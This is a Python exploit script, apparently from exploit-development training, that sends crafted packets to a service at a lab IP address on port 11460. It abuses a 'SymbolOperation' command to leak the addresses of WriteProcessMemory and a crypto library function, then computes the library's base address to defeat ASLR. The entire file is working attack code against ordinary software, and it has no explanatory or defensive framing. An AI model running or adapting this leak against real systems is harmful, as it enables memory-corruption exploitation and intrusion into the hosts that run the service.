#!/usr/bin/env python3

import socket
import sys
from struct import pack

# psAgentCommand
psAgentCommand = bytearray([0x41] * 0xC)
psAgentCommand += pack("<i", 0x2000)  # opcode
psAgentCommand += pack("<i", 0x0)  # 1st memcpy: offset
psAgentCommand += pack("<i", 0x100)  # 1st memcpy: size field
psAgentCommand += pack("<i", 0x100)  # 2nd memcpy: offset
psAgentCommand += pack("<i", 0x100)  # 2nd memcpy: size field
psAgentCommand += pack("<i", 0x200)  # 3rd memcpy: offset
psAgentCommand += pack("<i", 0x100)  # 3rd memcpy: size field
psAgentCommand += bytearray([0x41] * 0x8)

# psCommandBuffer
# symbol = b"SymbolOperationN98E_CRYPTO_get_new_lockid" + b"\x00"
# buf += symbol + b"A" * (100 - len(symbol))
# buf += b"B" * 0x100
# buf += b"C" * 0x100

# Checksum
# buf = pack(">i", len(buf) - 4) + buf


def parseResponse(response):
    """ Parse a server response and extract the leaked address """
    pattern = b"Address is:"
    address = None
    for line in response.split(b"\n"):
        if line.find(pattern) != -1:
            address = int((line.split(pattern)[-1].strip()), 16)
    if not address:
        print("[-] Could not find the address in the Response")
        sys.exit()
    return address


def leak_function_address(function_name: bytearray, server: str, port: int) -> int:
    """ Leaks a function address from the server. """
    symbol = b"SymbolOperation" + function_name + b"\x00"
    psCommandBuffer = symbol + b"A" * (100 - len(symbol))
    psCommandBuffer += b"B" * 0x100
    psCommandBuffer += b"C" * 0x100

    # checksum and command.
    buf = pack(">i", len(psAgentCommand) + len(psCommandBuffer) - 4) + psAgentCommand + psCommandBuffer

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    response = s.recv(1024)
    s.close()

    return parseResponse(response)


def main():
    server = "192.168.185.10"
    port = 11460

    write_process_memory_addr = leak_function_address(b"WriteProcessMemory", server, port)
    get_new_lockid_addr = leak_function_address(b"N98E_CRYPTO_get_new_lockid", server, port)
    libeay32IBM019Base = get_new_lockid_addr - 0x14E0


    print("WriteProcessMemory Address: " + hex(write_process_memory_addr))
    print("N98E_CRYPTO_get_new_lockid Address: " + hex(get_new_lockid_addr))
    print("Libeay32IBM019 Base Address: " + hex(libeay32IBM019Base))

    sys.exit(0)


if __name__ == "__main__":
    main()
